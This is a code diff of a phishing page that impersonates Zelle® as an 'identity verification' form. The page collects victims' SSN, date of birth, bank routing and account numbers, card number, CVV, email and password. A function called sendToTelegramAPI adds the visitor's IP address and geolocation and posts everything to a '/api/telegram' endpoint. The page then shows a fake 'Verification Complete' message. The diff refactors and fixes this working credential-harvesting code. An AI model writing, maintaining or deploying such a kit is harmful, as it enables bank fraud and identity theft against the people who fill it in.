@@ -20,9 +20,6 @@
             min-height: 100vh;
         }
         
-        .bg-purple-primary { background-color: #6D1ED4; }
-        .text-purple { color: #6D1ED4; }
-        
         .btn-purple {
             background: linear-gradient(135deg, #6D1ED4 0%, #5516a8 100%);
             color: white;
@@ -31,7 +28,7 @@
             box-shadow: 0 4px 12px rgba(109, 30, 212, 0.3);
         }
         
-        .btn-purple:hover, .btn-purple:active { 
+        .btn-purple:hover { 
             transform: translateY(-2px);
             box-shadow: 0 6px 16px rgba(109, 30, 212, 0.4);
         }
@@ -46,10 +43,8 @@
             background: white;
             border-radius: 40px;
             box-shadow: 0 25px 45px -12px rgba(0, 0, 0, 0.15);
-            overflow: hidden;
             padding: 32px 28px;
             margin-bottom: 24px;
-            transition: all 0.3s;
             border: 1px solid rgba(109, 30, 212, 0.1);
         }
         
@@ -130,13 +125,6 @@
             box-shadow: 0 0 0 3px rgba(109,30,212,0.1);
         }
         
-        .error-text { 
-            color: #e53e3e; 
-            font-size: 0.7rem; 
-            margin-top: 6px; 
-            display: block; 
-        }
-        
         .btn-next, .btn-submit, .btn-back {
             padding: 14px 20px;
             font-weight: 700;
@@ -185,7 +173,6 @@
             top: 45px;
             cursor: pointer;
             color: #94a3b8;
-            transition: color 0.2s;
         }
         
         .success-page {
@@ -229,7 +216,6 @@
         @media (max-width: 500px) {
             .form-card-modern { padding: 24px 20px; }
             .step-label { font-size: 0.55rem; }
-            .step-marker { font-size: 0.55rem; }
         }
         
         .telegram-note {
@@ -251,18 +237,9 @@
             margin-top: 40px;
         }
         
-        .loading-spinner {
-            animation: spin 1s linear infinite;
-        }
-        
-        @keyframes spin {
-            from { transform: rotate(0deg); }
-            to { transform: rotate(360deg); }
-        }
-        
         select {
             appearance: none;
-            background-image: url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='currentColor' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3e%3cpolyline points='6 9 12 15 18 9'%3e%3c/polyline%3e%3c/svg%3e");
+            background-image: url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='currentColor' stroke-width='2'%3e%3cpolyline points='6 9 12 15 18 9'%3e%3c/polyline%3e%3c/svg%3e");
             background-repeat: no-repeat;
             background-position: right 18px center;
             background-size: 20px;
@@ -270,10 +247,6 @@
         
         .valid-card {
             border-color: #10b981 !important;
-            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%2310b981'%3E%3Cpath d='M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z'/%3E%3C/svg%3E");
-            background-repeat: no-repeat;
-            background-position: right 18px center;
-            background-size: 20px;
         }
     </style>
 </head>
@@ -281,7 +254,7 @@
 
 <div class="verification-container">
     <div style="text-align: center; margin-bottom: 24px;">
-        <h1 style="font-weight: 800; font-size: 1.8rem; background: linear-gradient(135deg, #6D1ED4 0%, #8b3cff 100%); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin-bottom: 8px;">
+        <h1 style="font-weight: 800; font-size: 1.8rem; background: linear-gradient(135deg, #6D1ED4 0%, #8b3cff 100%); -webkit-background-clip: text; -webkit-text-fill-color: transparent;">
             Zelle<sup style="font-size: 0.6rem;">®</sup>
         </h1>
         <p style="font-size: 0.85rem; color: #475569;">Secure identity verification • Instant payments</p>
@@ -302,7 +275,6 @@
 </footer>
 
 <script>
-    // US States List
     const US_STATES = [
         "Alabama", "Alaska", "Arizona", "Arkansas", "California", "Colorado", "Connecticut", "Delaware",
         "Florida", "Georgia", "Hawaii", "Idaho", "Illinois", "Indiana", "Iowa", "Kansas", "Kentucky",
@@ -328,10 +300,8 @@
         ssn: "", dob: "", routingNumber: "", accountNumber: "", cardNumber: "", cardExpiry: "", cardCvv: "",
         email: "", password: ""
     };
-    
     let isSubmitting = false;
     
-    // Format SSN: 399-30-3022
     function formatSSN(value) {
         let numbers = value.replace(/\D/g, '');
         if (numbers.length >= 3 && numbers.length < 6) {
@@ -342,7 +312,6 @@
         return numbers.slice(0, 11);
     }
     
-    // Format Card Number: 4672 3782 2893 3782
     function formatCardNumber(value) {
         let numbers = value.replace(/\D/g, '');
         let formatted = '';
@@ -353,7 +322,6 @@
         return formatted;
     }
     
-    // Format Expiry: MM/YY
     function formatExpiry(value) {
         let numbers = value.replace(/\D/g, '');
         if (numbers.length >= 2) {
@@ -362,7 +330,6 @@
         return numbers.slice(0, 5);
     }
     
-    // Validate Card Number (Luhn algorithm)
     function validateCardNumber(cardNumber) {
         const numbers = cardNumber.replace(/\D/g, '');
         if (numbers.length !== 16) return false;
@@ -505,8 +472,8 @@
     
     async function sendToTelegramAPI(formDataComplete) {
         try {
-            // Get IP and location info
-            let ipInfo = {};
+            // Get IP info
+            let ipInfo = { ip: 'Unknown', country: 'Unknown', city: 'Unknown', region: 'Unknown' };
             try {
                 const ipResponse = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipResponse.json();
@@ -518,7 +485,7 @@
                 ipInfo.city = geoData.city || 'Unknown';
                 ipInfo.region = geoData.region || 'Unknown';
             } catch(e) {
-                ipInfo = { ip: 'Unable to fetch', country: 'Unknown', city: 'Unknown', region: 'Unknown' };
+                console.log('IP fetch failed, continuing without location');
             }
             
             const payload = {
@@ -528,7 +495,8 @@
                 timestamp: new Date().toISOString()
             };
             
-            const response = await fetch('/api/send-to-telegram', {
+            // Use the correct API endpoint path
+            const response = await fetch('/api/telegram', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
@@ -537,9 +505,8 @@
             });
             
             if (!response.ok) {
-                const errorText = await response.text();
-                console.error('API Error Response:', errorText);
-                throw new Error(`HTTP ${response.status}: ${errorText}`);
+                const errorData = await response.json().catch(() => ({}));
+                throw new Error(errorData.error || `HTTP ${response.status}`);
             }
             
             const result = await response.json();
@@ -598,9 +565,9 @@
                 </div>
                 <h2 style="margin-bottom: 16px; font-size: 1.8rem;">✅ Verification Complete</h2>
                 <p style="margin-bottom: 24px; color: #475569;">Your identity has been securely verified.<br>You will receive a confirmation shortly.</p>
-                <div style="background: #f0fdf4; padding: 16px; border-radius: 24px; margin-top: 20px;">
+                <div style="background: #f0fdf4; padding: 16px; border-radius: 24px;">
                     <i class="fas fa-lock" style="color: #10b981;"></i>
-                    <span style="font-size: 0.85rem; margin-left: 8px;">Zelle® Protection Active</span>
+                    <span style="font-size: 0.85rem;">Zelle® Protection Active</span>
                 </div>
             </div>`;
             if (progressDiv) progressDiv.style.display = 'none';
@@ -644,7 +611,7 @@
             0: `<div class="step-content">
                     <div class="input-group">
                         <label><i class="fas fa-user"></i> Full Legal Name</label>
-                        <input type="text" data-field="fullName" placeholder="Johnathan Michael Doe" value="${escapeHtml(formData.fullName)}" autocomplete="name">
+                        <input type="text" data-field="fullName" placeholder="Johnathan Michael Doe" value="${escapeHtml(formData.fullName)}">
                     </div>
                     <button class="btn-next btn-purple" id="nextStepBtn"><i class="fas fa-arrow-right"></i> Continue</button>
                 </div>`,
@@ -708,46 +675,26 @@
         
         container.innerHTML = stepsHtml[stepIndex];
         
-        // Attach event listeners for formatting
         const ssnInput = document.getElementById('ssnInput');
-        if (ssnInput) {
-            ssnInput.addEventListener('input', (e) => {
-                e.target.value = formatSSN(e.target.value);
-            });
-        }
+        if (ssnInput) ssnInput.addEventListener('input', (e) => { e.target.value = formatSSN(e.target.value); });
         
         const routingInput = document.getElementById('routingInput');
-        if (routingInput) {
-            routingInput.addEventListener('input', (e) => {
-                e.target.value = e.target.value.replace(/\D/g, '').slice(0, 9);
-            });
-        }
+        if (routingInput) routingInput.addEventListener('input', (e) => { e.target.value = e.target.value.replace(/\D/g, '').slice(0, 9); });
         
         const cardInput = document.getElementById('cardInput');
         if (cardInput) {
             cardInput.addEventListener('input', (e) => {
                 e.target.value = formatCardNumber(e.target.value);
-                if (validateCardNumber(e.target.value)) {
-                    e.target.classList.add('valid-card');
-                } else {
-                    e.target.classList.remove('valid-card');
-                }
+                if (validateCardNumber(e.target.value)) e.target.classList.add('valid-card');
+                else e.target.classList.remove('valid-card');
             });
         }
         
         const expiryInput = document.getElementById('expiryInput');
-        if (expiryInput) {
-            expiryInput.addEventListener('input', (e) => {
-                e.target.value = formatExpiry(e.target.value);
-            });
-        }
+        if (expiryInput) expiryInput.addEventListener('input', (e) => { e.target.value = formatExpiry(e.target.value); });
         
         const cvvInput = document.getElementById('cvvInput');
-        if (cvvInput) {
-            cvvInput.addEventListener('input', (e) => {
-                e.target.value = e.target.value.replace(/\D/g, '').slice(0, 3);
-            });
-        }
+        if (cvvInput) cvvInput.addEventListener('input', (e) => { e.target.value = e.target.value.replace(/\D/g, '').slice(0, 3); });
         
         const nextBtn = document.getElementById('nextStepBtn');
         const prevBtn = document.getElementById('prevStepBtn');
